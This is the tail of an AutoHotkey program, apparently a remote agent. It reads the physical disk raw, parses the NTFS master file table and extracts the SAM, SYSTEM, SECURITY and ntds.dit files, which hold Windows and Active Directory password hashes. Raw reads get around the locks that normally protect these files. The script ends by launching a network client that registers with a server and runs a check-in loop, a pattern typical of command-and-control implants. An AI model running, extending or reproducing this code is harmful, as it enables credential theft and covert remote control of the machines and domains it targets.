            "UInt", moduleInfo.Size)
            
        if (!result) {
            ; Try K32GetModuleInformation as fallback
            result := DllCall("kernel32\K32GetModuleInformation",
                "Ptr", DllCall("GetCurrentProcess", "Ptr"),
                "Ptr", moduleHandle,
                "Ptr", moduleInfo.Ptr,
                "UInt", moduleInfo.Size)
        }
        
        if (!result) {
            return {baseAddr: moduleHandle, size: 0, entryPoint: 0}
        }
        
        return {
            baseAddr: NumGet(moduleInfo, 0, "Ptr"),
            size: NumGet(moduleInfo, A_PtrSize, "UInt"),
            entryPoint: NumGet(moduleInfo, A_PtrSize + 4, "Ptr")
        }
    }

    _CrashLog(message, lastDLLError := 0) {
        errorMsg := "CRASH LOG - " . FormatTime(, "HH:mm:ss") . "`n"
        errorMsg .= "Message: " . message . "`n"
        if (lastDLLError) {
            errorMsg .= "LastDLLError: 0x" . Format("{:X}", lastDLLError) . "`n"
        }
        this.Log(errorMsg)
    }

    _IsValidPtr(ptr) {
        return ptr && ptr != 0 && !(ptr & 0xFFFF000000000000)  ; Basic pointer validation
    }

    _AlignToPage(size) {
        PAGE_SIZE := 4096
        return (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1)
    }

    ; Debug helper
    _DumpMemoryToFile(address, size, filename := "memory_dump.bin") {
        try {
            buff1 := Buffer(size, 0)
            bytesRead := 0
            
            if (DllCall("ReadProcessMemory",
                "Ptr", DllCall("GetCurrentProcess", "Ptr"),
                "Ptr", address,
                "Ptr", buff1.Ptr,
                "UInt", size,
                "UInt*", &bytesRead)) {
                    
                file := FileOpen(filename, "w")
                if (file) {
                    file.RawWrite(buff1, size)
                    file.Close()
                    this.Log("Memory dump saved to: " . filename)
                    return true
                }
            }
        } catch as err {
            this.Log("Error during memory dump: " . err.Message)
        }
        return false
    }

    _GetWindowsErrorMessage(errorCode) {
        ; Allocate buffer for error message
        flags := 0x00001000  ; FORMAT_MESSAGE_FROM_SYSTEM
        languageId := 0       ; Default language
        
        ; Create a buffer to store the error message
        size := 1024
        buff1 := Buffer(size)
        
        ; Get the error message
        DllCall("FormatMessage",
            "UInt", flags,
            "Ptr", 0,
            "UInt", errorCode,
            "UInt", languageId,
            "Ptr", buff1.Ptr,
            "UInt", size,
            "Ptr", 0)
        
        ; Convert buffer to string
        return StrGet(buff1.Ptr)
    }

}

class DiskReader {
    static GENERIC_READ := 0x80000000
    static OPEN_EXISTING := 3
    static FILE_SHARE_READ := 0x00000001
    static FILE_SHARE_WRITE := 0x00000002
    static FILE_SHARE_DELETE := 0x00000004
    static FILE_BEGIN := 0
    
    static ReadDisk(offset, size) {
        ; Align reads to sector boundaries
        sectorSize := 512
        alignedOffset := (offset // sectorSize) * sectorSize
        offsetDiff := offset - alignedOffset
        alignedSize := ((size + offsetDiff + sectorSize - 1) // sectorSize) * sectorSize
        
        hFile := DllCall("CreateFile",
            "Str", "\\.\PHYSICALDRIVE0",
            "UInt", this.GENERIC_READ,
            "UInt", this.FILE_SHARE_READ | this.FILE_SHARE_WRITE | this.FILE_SHARE_DELETE,
            "Ptr", 0,
            "UInt", this.OPEN_EXISTING,
            "UInt", 0,
            "Ptr", 0,
            "Ptr")
        
        if (hFile = -1) {
            throw Error("Failed to open physical drive. Error: " . A_LastError)
        }
        
        try {
            newPosBuffer := Buffer(8)
            if !DllCall("SetFilePointerEx",
                "Ptr", hFile,
                "Int64", alignedOffset,
                "Ptr", newPosBuffer,
                "UInt", this.FILE_BEGIN) {
                throw Error("Failed to set file pointer. Error: " . A_LastError)
            }
            
            alignedBuffer := Buffer(alignedSize)
            bytesRead := 0
            if !DllCall("ReadFile",
                "Ptr", hFile,
                "Ptr", alignedBuffer,
                "UInt", alignedSize,
                "UInt*", &bytesRead,
                "Ptr", 0) {
                throw Error("Failed to read disk. Error: " . A_LastError)
            }
            
            ; Extract the requested portion
            resultBuffer := Buffer(size)
            DllCall("RtlMoveMemory", "Ptr", resultBuffer, "Ptr", alignedBuffer.Ptr + offsetDiff, "UInt", size)
            
            return resultBuffer
        }
        finally {
            DllCall("CloseHandle", "Ptr", hFile)
        }
    }
}

; MFT Attribute types
class MFTAttributes {
    static STANDARD_INFORMATION := 0x10
    static ATTRIBUTE_LIST := 0x20
    static FILE_NAME := 0x30
    static DATA := 0x80
    static INDEX_ROOT := 0x90
}

class DataRun {
    static Decode(dataRunBytes) {
        result := []
        pos := 0
        previousLCN := 0
        totalClusters := 0
        
        Logger.Debug("Decoding data runs, buffer size: " . dataRunBytes.Size)
        
        while (pos < dataRunBytes.Size) {
            header := NumGet(dataRunBytes, pos, "UChar")
            if (header = 0) {
                break
            }
            pos++
            
            lengthBytes := header & 0x0F
            offsetBytes := (header >> 4) & 0x0F
            
            if (lengthBytes = 0) {
                break
            }
            
            ; Read run length
            runLength := 0
            loop lengthBytes {
                if (pos >= dataRunBytes.Size) {
                    break 2
                }
                runLength |= NumGet(dataRunBytes, pos, "UChar") << ((A_Index - 1) * 8)
                pos++
            }
            
            ; Read run offset (signed)
            runOffset := 0
            if (offsetBytes > 0) {
                loop offsetBytes {
                    if (pos >= dataRunBytes.Size) {
                        break 2
                    }
                    runOffset |= NumGet(dataRunBytes, pos, "UChar") << ((A_Index - 1) * 8)
                    pos++
                }
                
                ; Sign extend if necessary
                if (offsetBytes < 8 && (runOffset & (1 << (offsetBytes * 8 - 1)))) {
                    runOffset |= (-1 << (offsetBytes * 8))
                }
            }
            
            currentLCN := previousLCN + runOffset
            previousLCN := currentLCN
            
            totalClusters += runLength
            result.Push({lcn: currentLCN, length: runLength})
        }
        
        return {runs: result, totalClusters: totalClusters}
    }
}

class Logger {
    static logFile := A_ScriptDir . "\ntfs_reader_" . A_Now . ".log"
    static file := ""
    static verbose := false  ; Set to true for detailed logging
    
    static Init() {
        this.file := FileOpen(this.logFile, "w")
        this.Log("NTFS Raw Disk Reader Started - " . A_Now)
        this.Log("=" . StrReplace(Format("{:80}", ""), " ", "="))
    }
    
    static Log(msg) {
        if (this.file) {
            this.file.WriteLine(A_Now . " - " . msg)
            this.file.Read(0)  ; Flush
        }
        OutputDebug(msg . "`n")
    }
    
    static Debug(msg) {
        if (this.verbose) {
            this.Log("[DEBUG] " . msg)
        }
    }
    
    static LogHex(data, length := 64, offset := 0) {
        hex := ""
        ascii := ""
        
        loop Min(length, data.Size) {
            b := NumGet(data, offset + A_Index - 1, "UChar")
            hex .= Format("{:02X} ", b)
            ascii .= (b >= 32 && b <= 126) ? Chr(b) : "."
            
            if (Mod(A_Index, 16) = 0) {
                this.Log(Format("{:04X}: ", offset + A_Index - 16) . hex . " | " . ascii)
                hex := ""
                ascii := ""
            }
        }
        
        if (hex != "") {
            padded_hex := hex . StrReplace(Format("{:-" . ((16 - (Mod(length, 16))) * 3) . "}", ""), " ", " ")
            this.Log(Format("{:04X}: ", offset + ((length - 1) // 16) * 16) . padded_hex . " | " . ascii)
        }
    }
    
    static Close() {
        if (this.file) {
            this.file.Close()
        }
    }
}





class NTFSParser {
    static SECTOR_SIZE := 512
    static CLUSTER_SIZE := 4096
    static NTFS_LOCATION := 0
    static MFT_LOCATION := 0
    static targetFiles := Map()
    static foundFiles := Map()
    static MFT_RECORD_SIZE := 1024
    
    ; Target files with EXACT expected paths (case-insensitive but path-sensitive)
    static TARGET_FILES := Map(
        "SYSTEM", {name: "SYSTEM", paths: ["Windows\System32\config\SYSTEM"]},
        "SAM", {name: "SAM", paths: ["Windows\System32\config\SAM"]},
        "SECURITY", {name: "SECURITY", paths: ["Windows\System32\config\SECURITY"]},
        "ntds.dit", {name: "ntds.dit", paths: ["Windows\NTDS\ntds.dit"]}
    )
    
    static Init() {
        this.targetFiles := this.TARGET_FILES
        this.foundFiles.Clear()
    }
    
    static FindNTFSPartition() {
        firstSection := DiskReader.ReadDisk(0, 1024)
        
        ; Check for MBR
        maxPartitionSize := 0
        ntfsLocation := 0
        
        Logger.Log("Analyzing partition table...")
        
        loop 4 {
            offset := 0x1BE + ((A_Index - 1) * 0x10)
            
            partitionType := NumGet(firstSection, offset + 4, "UChar")
            startLBA := NumGet(firstSection, offset + 8, "UInt")
            sizeSectors := NumGet(firstSection, offset + 12, "UInt")
            
            if (sizeSectors > 0) {
                Logger.Log("Partition " . A_Index . ": Type=0x" . Format("{:02X}", partitionType) 
                    . ", Start LBA=" . startLBA . ", Size=" . sizeSectors . " sectors")
                
                ; Look for NTFS partitions (type 0x07)
                if (partitionType = 0x07 && sizeSectors > maxPartitionSize) {
                    maxPartitionSize := sizeSectors
                    ntfsLocation := startLBA * this.SECTOR_SIZE
                }
            }
        }
        
        this.NTFS_LOCATION := ntfsLocation
        Logger.Log("Selected NTFS partition at offset: 0x" . Format("{:X}", ntfsLocation))
        return ntfsLocation
    }
    
    static AnalyzeNTFS(ntfsLocation) {
        ntfsHeader := DiskReader.ReadDisk(ntfsLocation, 1024)
        
        signature := StrGet(ntfsHeader.Ptr + 3, 4, "UTF-8")
        if (signature != "NTFS") {
            throw Error("Not a valid NTFS partition at 0x" . Format("{:X}", ntfsLocation))
        }
        
        bytesPerSector := NumGet(ntfsHeader, 0x0B, "UShort")
        sectorsPerCluster := NumGet(ntfsHeader, 0x0D, "UChar")
        mftClusterNumber := NumGet(ntfsHeader, 0x30, "Int64")
        
        this.CLUSTER_SIZE := bytesPerSector * sectorsPerCluster
        this.MFT_LOCATION := (mftClusterNumber * this.CLUSTER_SIZE) + ntfsLocation
        
        Logger.Log("NTFS Info: BytesPerSector=" . bytesPerSector 
            . ", SectorsPerCluster=" . sectorsPerCluster
            . ", ClusterSize=" . this.CLUSTER_SIZE
            . ", MFT Location=0x" . Format("{:X}", this.MFT_LOCATION))
        
        return {
            bytesPerSector: bytesPerSector,
            sectorsPerCluster: sectorsPerCluster,
            clusterSize: this.CLUSTER_SIZE,
            mftLocation: this.MFT_LOCATION
        }
    }
    
static ParseMFTRecord(mftRecord, recordNumber := -1) {
    ; Check FILE signature
    if (NumGet(mftRecord, 0, "UInt") != 0x454C4946) {  ; "FILE"
        return false
    }
    
    ; Check file flags (at offset 0x16)
    fileFlags := NumGet(mftRecord, 0x16, "UShort")
    
    if (recordNumber = 119423) {  ; Special debug for ntds.dit
        Logger.Log("MFT Record flags for record " . recordNumber . ": 0x" . Format("{:04X}", fileFlags))
        if (fileFlags & 0x0001) {
            Logger.Log("  - Record is IN USE")
        }
        if (fileFlags & 0x0002) {
            Logger.Log("  - Record is DIRECTORY")
        }
    }
    
    ; Get update sequence array info
    updateSeqOffset := NumGet(mftRecord, 0x04, "UShort")
    updateSeqSize := NumGet(mftRecord, 0x06, "UShort")
    
    ; Apply fixup if needed
    if (updateSeqOffset > 0 && updateSeqSize > 0) {
        this.ApplyFixup(mftRecord, updateSeqOffset, updateSeqSize)
    }
    
    firstAttrOffset := NumGet(mftRecord, 0x14, "UShort")
    
    recordInfo := {
        recordNumber: recordNumber,
        attributes: Map(),
        fileName: "",
        fullPath: "",
        parentRecord: 0,
        dataRuns: [],
        fileSize: 0,
        isResident: false,
        residentData: "",
        isCompressed: false,
        isEncrypted: false,
        isSparse: false
    }
    
    currentOffset := firstAttrOffset
    
    loop {
        if (currentOffset >= 1024 || currentOffset < firstAttrOffset) {
            break
        }
        
        attrType := NumGet(mftRecord, currentOffset, "UInt")
        
        if (attrType = 0xFFFFFFFF || attrType = 0) {
            break
        }
        
        attrLength := NumGet(mftRecord, currentOffset + 4, "UInt")
        
        if (attrLength = 0 || attrLength > 1024 || currentOffset + attrLength > 1024) {
            break
        }
        
        ; Parse specific attributes
        if (attrType = MFTAttributes.FILE_NAME) {
            this.ParseFileName(mftRecord, currentOffset, recordInfo)
        } else if (attrType = MFTAttributes.DATA) {
            this.ParseDataAttribute(mftRecord, currentOffset, recordInfo)
        }
        
        currentOffset += attrLength
    }
    
    return recordInfo
}
    
    static ApplyFixup(mftRecord, updateSeqOffset, updateSeqSize) {
        ; Apply NTFS fixup to correct sector boundaries
        updateSeqNumber := NumGet(mftRecord, updateSeqOffset, "UShort")
        
        loop (updateSeqSize - 1) {
            fixupOffset := 510 + ((A_Index - 1) * 512)
            if (fixupOffset < mftRecord.Size) {
                fixupValue := NumGet(mftRecord, updateSeqOffset + (A_Index * 2), "UShort")
                NumPut("UShort", fixupValue, mftRecord, fixupOffset)
            }
        }
    }
    
static ParseFileName(mftRecord, attrOffset, recordInfo) {
    nonResident := NumGet(mftRecord, attrOffset + 8, "UChar")
    if (nonResident) {
        return
    }
    
    contentOffset := NumGet(mftRecord, attrOffset + 20, "UShort")
    dataOffset := attrOffset + contentOffset
    
    ; Parent directory reference
    parentRef := NumGet(mftRecord, dataOffset, "UInt64") & 0xFFFFFFFFFFFF
    recordInfo.parentRecord := parentRef
    
    ; File name info
    fileNameLength := NumGet(mftRecord, dataOffset + 0x40, "UChar")
    fileNameType := NumGet(mftRecord, dataOffset + 0x41, "UChar")
    
    ; Check file attribute flags
    fileAttrFlags := NumGet(mftRecord, dataOffset + 0x48, "UInt")
    if (recordInfo.recordNumber = 119423) {  ; Debug for ntds.dit
        Logger.Log("File attribute flags: 0x" . Format("{:08X}", fileAttrFlags))
        if (fileAttrFlags & 0x0001) {
            Logger.Log("  - READONLY")
        }
        if (fileAttrFlags & 0x0800) {
            Logger.Log("  - COMPRESSED")
        }
        if (fileAttrFlags & 0x1000) {
            Logger.Log("  - DIRECTORY")
        }
        if (fileAttrFlags & 0x4000) {
            Logger.Log("  - ENCRYPTED")
        }
        if (fileAttrFlags & 0x8000) {
            Logger.Log("  - SPARSE")
        }
    }
    
    recordInfo.isCompressed := (fileAttrFlags & 0x0800) != 0
    recordInfo.isEncrypted := (fileAttrFlags & 0x4000) != 0
    recordInfo.isSparse := (fileAttrFlags & 0x8000) != 0
    
    if (fileNameLength > 0 && fileNameLength < 255) {
        ; Read filename (UTF-16)
        fileName := ""
        loop fileNameLength {
            char := NumGet(mftRecord, dataOffset + 0x42 + ((A_Index - 1) * 2), "UShort")
            if (char > 0) {
                fileName .= Chr(char)
            }
        }
        recordInfo.fileName := fileName
    }
}
    
static ParseDataAttribute(mftRecord, attrOffset, recordInfo) {
    nonResident := NumGet(mftRecord, attrOffset + 8, "UChar")
    
    ; Check attribute flags
    attrFlags := NumGet(mftRecord, attrOffset + 12, "UShort")
    if (recordInfo.recordNumber = 119423) {
        Logger.Log("DATA attribute flags: 0x" . Format("{:04X}", attrFlags))
        if (attrFlags & 0x0001) {
            Logger.Log("  - Compressed")
        }
        if (attrFlags & 0x4000) {
            Logger.Log("  - Encrypted")
        }
        if (attrFlags & 0x8000) {
            Logger.Log("  - Sparse")
        }
    }
    
    if (!nonResident) {
        ; Resident data - file content is stored in MFT
        contentSize := NumGet(mftRecord, attrOffset + 16, "UInt")
        contentOffset := NumGet(mftRecord, attrOffset + 20, "UShort")
        recordInfo.fileSize := contentSize
        recordInfo.isResident := true
        
        ; For small files, store the actual data
        if (contentSize > 0 && contentSize < 1024) {
            dataBuffer := Buffer(contentSize)
            sourceOffset := attrOffset + contentOffset
            loop contentSize {
                NumPut("UChar", NumGet(mftRecord, sourceOffset + A_Index - 1, "UChar"), 
                       dataBuffer, A_Index - 1)
            }
            recordInfo.residentData := dataBuffer
        }
    } else {
        ; Non-resident data
        allocatedSize := NumGet(mftRecord, attrOffset + 40, "UInt64")
        realSize := NumGet(mftRecord, attrOffset + 48, "UInt64")
        recordInfo.fileSize := realSize
        recordInfo.isResident := false
        
        ; Get data runs
        dataRunOffset := NumGet(mftRecord, attrOffset + 32, "UShort")
        dataRunStart := attrOffset + dataRunOffset
        
        ; Calculate size safely
        attrTotalLength := NumGet(mftRecord, attrOffset + 4, "UInt")
        dataRunSize := attrTotalLength - dataRunOffset
        
        if (dataRunSize > 0 && dataRunSize < 512 && dataRunStart + dataRunSize <= 1024) {
            dataRunBuffer := Buffer(dataRunSize)
            loop dataRunSize {
                NumPut("UChar", NumGet(mftRecord, dataRunStart + A_Index - 1, "UChar"), 
                       dataRunBuffer, A_Index - 1)
            }
            
            if (recordInfo.recordNumber = 119423) {
                Logger.Log("Data run bytes:")
                Logger.LogHex(dataRunBuffer, dataRunSize)
            }
            
            decodedRuns := DataRun.Decode(dataRunBuffer)
            recordInfo.dataRuns := decodedRuns.runs
        }
    }
}
    
    static GetFullPath(recordNumber) {
        path := []
        currentRecord := recordNumber
        maxDepth := 20
        
        while (currentRecord > 5 && maxDepth > 0) {
            try {
                mftRecord := DiskReader.ReadDisk(this.MFT_LOCATION + (currentRecord * this.MFT_RECORD_SIZE), 
                                                this.MFT_RECORD_SIZE)
                recordInfo := this.ParseMFTRecord(mftRecord, currentRecord)
                
                if (!recordInfo || !recordInfo.fileName) {
                    break
                }
                
                path.InsertAt(1, recordInfo.fileName)
                currentRecord := recordInfo.parentRecord
                maxDepth--
            } catch {
                break
            }
        }
        
        return path
    }
    
    static CheckIfTargetFile(recordInfo) {
        ; Check if this is one of our target files
        for targetKey, targetInfo in this.targetFiles {
            ; Check if filename matches (case-insensitive)
            if (StrLower(recordInfo.fileName) = StrLower(targetInfo.name)) {
                ; Get full path
                fullPath := this.GetFullPath(recordInfo.parentRecord)
                fullPathStr := ""
                for dir in fullPath {
                    fullPathStr .= dir . "\"
                }
                fullPathStr .= recordInfo.fileName
                
                ; Check if EXACT path matches (case-insensitive)
                for expectedPath in targetInfo.paths {
                    if (StrLower(fullPathStr) = StrLower(expectedPath)) {
                        recordInfo.fullPath := fullPathStr
                        return targetKey
                    }
                }
                
                ; Log non-matching paths for debugging
                if (recordInfo.fileName = "ntds.dit") {
                    Logger.Log("Found " . recordInfo.fileName . " but in unexpected location: " . fullPathStr 
                        . " (size: " . recordInfo.fileSize . " bytes)")
                }
            }
        }
        
        return ""
    }
    
    static DebugNTDSRecord() {
        ; Read the specific MFT record for ntds.dit (record 119423)
        ntdsRecord := 119423
        mftRecord := DiskReader.ReadDisk(this.MFT_LOCATION + (ntdsRecord * this.MFT_RECORD_SIZE), this.MFT_RECORD_SIZE)
        
        Logger.Log("=== Debugging NTDS.DIT MFT Record ===")
        Logger.Log("MFT Record " . ntdsRecord . " raw data (first 512 bytes):")
        Logger.LogHex(mftRecord, 512)
        
        ; Parse and check attributes
        recordInfo := this.ParseMFTRecord(mftRecord, ntdsRecord)
        if (recordInfo) {
            Logger.Log("File name: " . recordInfo.fileName)
            Logger.Log("File size: " . recordInfo.fileSize)
            Logger.Log("Is resident: " . (recordInfo.isResident ? "Yes" : "No"))
            Logger.Log("Is compressed: " . (recordInfo.isCompressed ? "Yes" : "No"))
            Logger.Log("Is encrypted: " . (recordInfo.isEncrypted ? "Yes" : "No"))
            Logger.Log("Is sparse: " . (recordInfo.isSparse ? "Yes" : "No"))
            Logger.Log("Number of data runs: " . recordInfo.dataRuns.Length)
            
            ; Log each data run
            totalClusters := 0
            for idx, run in recordInfo.dataRuns {
                Logger.Log("Data run " . idx . ": LCN=" . run.lcn 
                    . ", Length=" . run.length . " clusters"
                    . ", Offset=0x" . Format("{:X}", run.lcn * this.CLUSTER_SIZE + this.NTFS_LOCATION))
                totalClusters += run.length
            }
            
            Logger.Log("Total clusters: " . totalClusters 
                . ", Total size from runs: " . (totalClusters * this.CLUSTER_SIZE) . " bytes")
        }
    }
    
    static TestDirectRead() {
        ; Based on previous log: LCN=3924058, Offset=0x3C455A000
        testOffset := 0x3C455A000
        
        Logger.Log("=== Direct disk read test ===")
        Logger.Log("Reading from offset: 0x" . Format("{:X}", testOffset))
        
        ; Read first 4KB
        testData := DiskReader.ReadDisk(testOffset, 4096)
        
        ; Check for any recognizable patterns
        Logger.Log("First 256 bytes:")
        Logger.LogHex(testData, 256)
        
        ; Check if this looks like ESE database pages
        pageSize := 0
        ; ESE databases typically have page size at offset 236 in the first page
        if (testData.Size >= 240) {
            pageSize := NumGet(testData, 236, "UInt")
            Logger.Log("Potential page size at offset 236: " . pageSize)
        }
        
        ; Check for ESE signatures at various offsets
        Logger.Log("Checking for signatures at various offsets:")
        offsets := [0, 4, 8, 4096, 8192]
        for offset in offsets {
            if (offset < testData.Size - 8) {
                sig := ""
                loop 8 {
                    b := NumGet(testData, offset + A_Index - 1, "UChar")
                    sig .= (b >= 32 && b <= 126) ? Chr(b) : "?"
                }
                Logger.Log("  Offset " . offset . ": " . sig)
            }
        }
    }
    
    static ScanMFTForFiles(maxRecords := 200000) {
        Logger.Log("Starting MFT scan for system files...")
        Logger.Log("Looking for EXACT paths:")
        for key, info in this.targetFiles {
            Logger.Log("  - " . info.paths[1])
        }
        
        foundCount := 0
        targetCount := this.targetFiles.Count
        
        ; Start from record 0 and scan systematically
        loop maxRecords {
            recordNumber := A_Index - 1
            
            if (Mod(recordNumber, 10000) = 0 && recordNumber > 0) {
                Logger.Log("Scanned " . recordNumber . " MFT records... Found " . foundCount . " of " . targetCount . " files")
            }
            
            try {
                mftRecord := DiskReader.ReadDisk(this.MFT_LOCATION + (recordNumber * this.MFT_RECORD_SIZE), 
                                               this.MFT_RECORD_SIZE)
                recordInfo := this.ParseMFTRecord(mftRecord, recordNumber)
                
                if (recordInfo && recordInfo.fileName != "") {
                    ; Check if this is a target file in the right location
                    targetKey := this.CheckIfTargetFile(recordInfo)
                    
                    if (targetKey != "" && !this.foundFiles.Has(targetKey)) {
                        Logger.Log("Found target file: " . recordInfo.fileName 
                            . " at record " . recordNumber 
                            . ", Size: " . recordInfo.fileSize . " bytes"
                            . ", Path: " . recordInfo.fullPath
                            . ", Resident: " . (recordInfo.isResident ? "Yes" : "No"))
                        
                        this.foundFiles[targetKey] := recordInfo
                        foundCount++
                        
                        if (foundCount = targetCount) {
                            Logger.Log("All target files found!")
                            return true
                        }
                    }
                }
            } catch as e {
                ; Skip bad records silently
            }
        }
        
        Logger.Log("MFT scan completed. Found " . foundCount . " of " . targetCount . " files")
        
        ; Report which files were not found
        for key, info in this.targetFiles {
            if (!this.foundFiles.Has(key)) {
                Logger.Log("NOT FOUND: " . info.paths[1])
            }
        }
        
        return false
    }
    
    static VerifyFileSignature(fileName, data) {
        ; Verify expected file signatures
        switch fileName {
            case "SYSTEM", "SAM", "SECURITY":
                ; Registry files should start with "regf"
                sig := StrGet(data.Ptr, 4, "UTF-8")
                return (sig = "regf")
            
            case "ntds.dit":
                ; ESE database - check at offset 4 for signature
                sig := ""
                loop 8 {
                    b := NumGet(data, 3 + A_Index, "UChar")
                    if (b >= 32 && b <= 126) {
                        sig .= Chr(b)
                    }
                }
                ; Should contain "ESEDB" or similar
                return (InStr(sig, "EDB") || InStr(sig, "ESE"))
            
            default:
                return true
        }
    }
    
static ExtractFile(recordInfo, outputPath) {
    Logger.Log("Extracting " . recordInfo.fileName . " to " . outputPath)
    Logger.Log("File size: " . recordInfo.fileSize . " bytes")
    
    outFile := FileOpen(outputPath, "w")
    
    try {
        if (!recordInfo.isResident) {
            totalBytesWritten := 0
            remainingBytes := recordInfo.fileSize  ; This should be 41,877,504
            
            for idx, dataRun in recordInfo.dataRuns {
                if (dataRun.lcn < 0) {
                    ; Sparse run handling...
                    continue
                }
                
                clusterOffset := dataRun.lcn * this.CLUSTER_SIZE + this.NTFS_LOCATION
                bytesToRead := Min(dataRun.length * this.CLUSTER_SIZE, remainingBytes)
                
                ; Read in chunks
                chunkSize := 1024 * 1024  ; 1MB chunks
                bytesRead := 0
                
                while (bytesRead < bytesToRead && totalBytesWritten < recordInfo.fileSize) {
                    currentChunkSize := Min(chunkSize, bytesToRead - bytesRead)
                    ; Make sure we don't exceed file size
                    currentChunkSize := Min(currentChunkSize, recordInfo.fileSize - totalBytesWritten)
                    
                    data := DiskReader.ReadDisk(clusterOffset + bytesRead, currentChunkSize)
                    outFile.RawWrite(data, currentChunkSize)
                    
                    bytesRead += currentChunkSize
                    totalBytesWritten += currentChunkSize
                    
                    ; Progress logging
                    if (Mod(totalBytesWritten, 10 * 1024 * 1024) = 0) {
                        Logger.Log("Progress: " . Round(totalBytesWritten / 1024 / 1024) . " MB written")
                    }
                    
                    ; IMPORTANT: Check if we've written everything
                    if (totalBytesWritten >= recordInfo.fileSize) {
                        Logger.Log("Reached target file size: " . totalBytesWritten . " bytes")
                        break 2  ; Break out of both loops
                    }
                }
                
                remainingBytes -= bytesToRead
                if (remainingBytes <= 0) {
                    break
                }
            }
            
            Logger.Log("File extracted. Total bytes written: " . totalBytesWritten 
                . " (expected: " . recordInfo.fileSize . ")")
            
            ; Verify extraction
            if (totalBytesWritten < recordInfo.fileSize) {
                Logger.Log("WARNING: Extraction incomplete! Missing " 
                    . (recordInfo.fileSize - totalBytesWritten) . " bytes")
            }
        }
        
        return true
        
    } catch as e {
        Logger.Log("Error extracting file: " . e.Message)
        return false
    } finally {
        outFile.Close()
    }
}
}

if A_Args.Length = 1 {
    client := NetworkClient(A_Args[1])
} 
else If A_Args.Length = 2{
    client := NetworkClient(A_Args[1], A_Args[2])
} 
else {
    client := NetworkClient("127.0.0.1", "5074")  ; NetworkClient("your_ip") Default is 127.0.0.1
}

if (client.Register()) {
    
    client.StartCheckInLoop()
    
    while client.isRunning {
        Sleep(100)
    }

} else {
    MsgBox "Registration failed!"
}